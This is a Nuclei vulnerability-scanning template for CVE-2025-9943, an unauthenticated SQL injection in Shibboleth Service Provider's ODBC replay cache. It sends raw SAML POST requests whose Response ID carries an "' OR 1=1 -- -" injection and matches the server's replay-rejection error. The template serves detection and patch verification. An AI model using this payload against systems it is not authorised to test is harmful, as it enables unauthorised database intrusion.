id: shibboleth-saml-sqli

info:
  name: Shibboleth Service Provider SAML SQL Injection - CVE-2025-9943
  author: nuclei-team
  severity: critical
  description: |
    An unauthenticated SQL injection vulnerability exists in Shibboleth Service Provider (SP) when the replay cache is configured to use an SQL database via ODBC interface. The vulnerability arises from insufficient escaping of single quotes in the ID attribute of SAML responses, allowing blind SQL injection attacks to extract arbitrary data from the database.
    
    IMPORTANT: The IssueInstant timestamp must be within a few minutes of current UTC time for the SAML response to be accepted by the SP.
  reference:
    - https://sec-consult.com/vulnerability-lab/advisory/unauthenticated-sql-injection-vulnerability-in-shibboleth-service-provider-sp-odbc-interface/
    - https://shibboleth.net/community/advisories/secadv_20250903.txt
    - https://nvd.nist.gov/vuln/detail/CVE-2025-9943
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-9943
    cwe-id: CWE-89
  metadata:
    verified: true
    max-request: 2
  tags: cve,cve2025,shibboleth,saml,sqli,injection,odbc

variables:
  sql_id: "{{randstr}}"

http:
  - raw:
      - |
        POST /Shibboleth.sso/SAML2/POST HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        SAMLResponse={{url_encode(base64('<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="{{sql_id}}\' OR 1=1 -- -" Version="2.0" IssueInstant="{{date_time("%Y-%m-%dT%H:%M:%SZ", unix_time())}}" Destination="{{BaseURL}}/Shibboleth.sso/SAML2/POST"><saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">urn:example:idp</saml:Issuer><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status></samlp:Response>'))}}

      - |
        POST /Shibboleth.sso/SAML2/POST HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        SAMLResponse={{url_encode(base64('<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="{{sql_id}}\' OR 1=1 -- -" Version="2.0" IssueInstant="{{date_time("%Y-%m-%dT%H:%M:%SZ", unix_time())}}" Destination="{{BaseURL}}/Shibboleth.sso/SAML2/POST"><saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">urn:example:idp</saml:Issuer><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status></samlp:Response>'))}}

    cookie-reuse: true
    
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Rejecting replayed message ID"

      - type: status
        status:
          - 500

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - "Rejecting replayed message ID \\((.*)\\)"
